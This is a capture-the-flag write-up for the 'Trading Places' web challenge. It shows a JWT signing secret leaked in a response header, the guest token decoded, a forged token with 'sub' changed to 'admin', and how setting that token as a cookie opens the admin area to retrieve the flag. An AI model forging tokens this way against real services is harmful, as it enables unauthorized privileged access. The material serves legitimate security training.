---
layout: post  
permalink: /writeups/metactf/2025/january/trading-places/writeup/  
title: "Trading Places"  
date: 2025-01-24 05:35  
tags: Web Exploitation  
description: "Trading Places"
---

## **Challenge Name: Trading Places**

### **Solves**

- **Solves:** 84
- **Points:** 150

### **Description**

My friends Hannah and Steven from college are starting up a new fintech company. They sent me the link to their trading platform so I can take a look (in demo mode). It's supposedly quite secure, using the latest in cryptographic standards.

Why don't you take a [look?](https://host5.metaproblems.com:7606/)

---

### **Approach**

After inspecting the response from the server, using burpsuite we got the following details:

```
HTTP/1.1 200 OK
date: Fri, 24 Jan 2025 00:06:51 GMT
server: uvicorn
content-length: 16
content-type: application/json
jwt: jwt_z3bXPravDcYhjy5mhYgYLbWRoAPkPyn
```

![Burp](Resources/image.png)

The response contains a JWT token. Let's decode and verify the JWT signature on [jwt.io](https://jwt.io):

```
jwt_z3bXPravDcYhjy5mhYgYLbWRoAPkPyn
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCIsImlhdCI6MTczNzY3NzI1NywiZXhwIjoxNzM3Njg0NDU3fQ.KdD1ycXGxMS_7g_ESouSe21GnOJ2282lFwb4N_72H2k
```

Upon decoding the JWT, we see that the `sub` (subject) is `guest`. Now, we modify the JWT by changing the `sub` field from `guest` to `admin`:

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTczNzY3NzI1NywiZXhwIjoxNzM3Njg0NDU3fQ.LgctxDjvkA5u7zzzC0bPBHEyWls6O9YHbIbwDc9lsa8
```

Now, we use this modified JWT in the request by setting it as a cookie in the browser's developer tools (under the application section). Once the new JWT is set, we can access the admin section and retrieve the flag.

### **Flag**

```
MetaCTF{cli3nt_s1d3_crypt0graph1c5}
```

---
